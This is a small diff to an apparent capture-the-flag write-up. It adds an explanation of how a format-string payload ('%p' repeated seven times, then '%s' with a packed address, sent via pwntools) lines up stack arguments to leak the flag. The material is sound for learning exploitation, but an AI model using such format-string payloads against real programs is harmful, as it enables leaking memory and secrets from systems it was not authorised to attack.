@@ -51,4 +51,15 @@ p.sendline(b"%p"*7+b"%s"+p64(addr))
 p.interactive()
 ```
 
+The order of args:
+
+- %p prints arg 1: Don't care
+- %p prints arg 2: Don't care
+- %p prints arg 3: Don't care
+- %p prints arg 4: Don't care
+- %p prints arg 5: Don't care
+- %p prints arg 6: %p%p%p%p
+- %p prints arg 7: %p%p%p%s
+- %s prints arg 8: the flag address is here
+
 Solved!
